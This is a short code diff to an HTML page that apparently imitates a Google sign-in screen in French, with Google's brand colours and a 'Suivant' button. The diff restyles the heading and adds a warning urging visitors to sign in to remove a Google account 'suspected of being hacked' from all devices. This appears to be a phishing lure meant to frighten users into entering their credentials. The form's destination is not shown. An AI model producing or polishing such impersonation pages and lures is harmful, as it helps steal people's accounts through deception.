@@ -29,9 +29,7 @@
             letter-spacing: -4px;
             margin-bottom: 10px;
             text-align: center;
-            background: linear-gradient(90deg, #4285F4, #EA4335, #FBBC05, #34A853);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #ffffff;
         }
         h1 {
             font-size: 28px;
@@ -87,6 +85,13 @@
         .btn:hover {
             background: #aecbfa;
         }
+        .warning {
+            margin-top: 50px;
+            font-size: 13px;
+            color: #9aa0a6;
+            text-align: center;
+            line-height: 1.4;
+        }
     </style>
 </head>
 <body>
@@ -107,6 +112,11 @@
                 <button type="submit" class="btn">Suivant</button>
             </div>
         </form>
+
+        <div class="warning">
+            Veuillez vous connecter pour supprimer de tous les appareils<br>
+            le compte Google qui a été suspecté être piraté.
+        </div>
     </div>
 
     <script>
